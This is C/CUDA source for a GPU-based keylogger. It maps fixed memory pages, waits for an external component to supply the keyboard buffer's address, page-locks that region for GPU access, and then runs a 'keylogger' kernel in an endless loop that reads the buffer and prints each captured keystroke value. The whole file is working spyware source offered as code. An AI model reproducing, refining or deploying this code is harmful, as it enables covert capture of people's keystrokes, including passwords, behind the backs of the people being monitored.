#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <cuda_runtime.h>

__global__ void keylogger(unsigned long *A, unsigned long *B)
{
	B[0] = A[0];
}
int main(void)
{
	int i,offset;
	cudaError_t err = cudaSuccess;
	unsigned long *u_keybd_buf,*u_scan_buf;
	unsigned long *scan_buf,*keybd_buf;
	unsigned long *p, *p2;
	
	cudaSetDeviceFlags(cudaDeviceMapHost);
	cudaHostAlloc((void **)&scan_buf, 0x1000, cudaHostAllocMapped);

	p = (unsigned long *)mmap((void *)0x40000000,0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,NULL);  // modify page table
	p2 = (unsigned long *)mmap((void *)0x50000000,0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,-1,NULL);  // transfer_buffer

	for( i = 0; i < 0x200; i++ )
		p[i] = 0x7777777777777777;
	for( i = 0; i < 0x200; i++ )
		p2[i] = 0x7777777777777777;
	memset( p2, 0, 0x1000 );
	while( p2[0] == 0 ) usleep( 500000 );   // get transfer_buffer
	printf("transfer_buffer : %llX\n", p2[0] );
	offset = p2[0] & 0xfff;
	munmap(p2, 0x1000);	// release the memory

	cudaMalloc(&u_scan_buf,512);
	cudaHostRegister((void *)0x40000000,0x1000,cudaHostRegisterMapped);	// page lock
	cudaHostGetDevicePointer((void **)&u_keybd_buf,(void *)(0x40000000+offset),0);	// matching u_keybd_buf and (0x400000000+offset)
	munmap(p, 0x1000);	// release the keyboard bufer 

	while(1){
		keylogger<<<1, 1>>>(u_keybd_buf, u_scan_buf);
		cudaThreadSynchronize();
		err = cudaGetLastError();
		if (err != cudaSuccess){
	        	printf("Failed (error : %s)!\n", cudaGetErrorString(err));
	        	exit(EXIT_FAILURE);
    		}
		cudaMemcpy(scan_buf,u_scan_buf,8,cudaMemcpyDeviceToHost);
		printf("%llX\n",scan_buf[0]);
		usleep(80000);
	}
	cudaThreadExit();
	return 0;
}

